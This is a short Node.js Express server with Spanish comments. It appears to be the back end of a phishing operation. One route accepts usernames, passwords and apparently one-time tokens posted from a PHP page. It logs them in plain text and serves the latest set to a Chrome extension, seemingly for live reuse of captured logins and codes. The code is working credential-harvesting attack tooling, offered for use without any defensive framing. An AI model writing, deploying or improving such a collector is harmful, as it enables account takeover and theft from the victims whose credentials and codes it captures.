const express = require('express');
const app = express();

// Para poder leer los datos que enviará tu PHP
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// 🚩 VARIABLE GLOBAL: Aquí se guardará el último dato en la nube
let baseDeDatosTemporal = {
    user: null,
    pass: null,
    token: null,
    origen: null,
    actualizado: false
};

// 1. RUTA PARA RECIBIR (La que usa tu PHP en XAMPP)
app.post('/recibir', (req, res) => {
    const { user, pass, token, origen } = req.body;
    
    // Guardamos en la "agenda" para la extensión
    baseDeDatosTemporal = {
        user: user || baseDeDatosTemporal.user, // Mantiene el usuario si solo llega el token
        pass: pass || baseDeDatosTemporal.pass,
        token: token || baseDeDatosTemporal.token,
        origen: origen,
        actualizado: true
    };

    // Seguimos mostrando en los Logs de Render para que tú lo veas
    console.log("===============================");
    console.log("🔔 DATO GUARDADO PARA EXTENSIÓN");
    console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
    console.log(`🔑 Clave: ${baseDeDatosTemporal.pass}`);
    console.log(`📲 Token: ${baseDeDatosTemporal.token}`);
    console.log("===============================");

    res.status(200).send("OK");
});

// 2. RUTA PARA CONSULTAR (La que usará la Extensión de Chrome)
app.get('/consultar', (req, res) => {
    // Le entregamos a la extensión lo que tenemos guardado
    res.json(baseDeDatosTemporal);
    
    // Opcional: una vez que la extensión lo lee, podrías marcarlo como 'visto'
    // baseDeDatosTemporal.actualizado = false; 
});

// Ruta simple de chequeo
app.get('/', (req, res) => {
    res.send("Servidor de Logs y API de Extensión Activo");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor activo en puerto ${PORT}`);
});
